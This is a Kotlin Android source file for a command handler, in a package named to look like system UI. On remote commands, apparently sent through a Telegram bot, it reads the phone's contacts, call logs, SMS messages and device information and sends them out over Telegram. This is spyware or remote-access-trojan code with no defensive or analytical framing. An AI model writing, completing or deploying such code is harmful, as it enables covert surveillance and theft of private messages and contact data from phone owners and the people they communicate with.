package com.systemui.relay

import android.content.Context
import android.util.Log
import com.systemui.relay.data.CallLogRepository
import com.systemui.relay.data.ContactsRepository
import com.systemui.relay.data.SmsRepository
import com.systemui.relay.utils.MessageFormatter
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object CommandHandler {
    private const val TAG = "DeviceRelay"

    suspend fun handle(ctx: Context, cmd: String) {
        try {
            when (cmd.trim()) {
                "/contacts" -> fetchContacts(ctx, 1)
                "/contacts2" -> fetchContacts(ctx, 2)
                "/calllog1" -> fetchCallLog(ctx, "today")
                "/calllog2" -> fetchCallLog(ctx, "yesterday")
                "/msgs1" -> fetchSms(ctx, 1)
                "/msgs2" -> fetchSms(ctx, 2)
                "/msgs3" -> fetchSms(ctx, 3)
                "/sysinfo" -> fetchSysInfo(ctx)
                "/status" -> TelegramApi.sendMessage("✅ Device relay is online.")
                else -> TelegramApi.sendMessage("❓ Unknown.\n/cmds: /contacts /contacts2 /calllog1 /calllog2 /msgs1 /msgs2 /msgs3 /sysinfo /status")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error: $cmd", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }

    private suspend fun fetchContacts(ctx: Context, page: Int) = withContext(Dispatchers.IO) {
        try {
            val all = ContactsRepository.getAllContacts(ctx)
            val start = (page - 1) * 50
            val end = minOf(start + 50, all.size)
            val pageData = if (start < all.size) all.subList(start, end) else emptyList()
            TelegramApi.sendLongMessage(MessageFormatter.formatContacts(pageData, page, all.size))
        } catch (e: Exception) {
            Log.e(TAG, "contacts error", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }

    private suspend fun fetchCallLog(ctx: Context, date: String) = withContext(Dispatchers.IO) {
        try {
            val logs = CallLogRepository.getCallLogs(ctx, date)
            TelegramApi.sendLongMessage(MessageFormatter.formatCallLogs(logs, date))
        } catch (e: Exception) {
            Log.e(TAG, "calllog error", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }

    private suspend fun fetchSms(ctx: Context, page: Int) = withContext(Dispatchers.IO) {
        try {
            val msgs = SmsRepository.getSms(ctx, page, 10)
            TelegramApi.sendLongMessage(MessageFormatter.formatSms(msgs, page))
        } catch (e: Exception) {
            Log.e(TAG, "sms error", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }

    private suspend fun fetchSysInfo(ctx: Context) = withContext(Dispatchers.IO) {
        try {
            val map = DeviceInfoCollector.getDeviceInfo(ctx)
            val text = DeviceInfoCollector.formatDeviceInfo(map)
            TelegramApi.sendMessage(text)
        } catch (e: Exception) {
            Log.e(TAG, "sysinfo error", e)
            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
        }
    }
}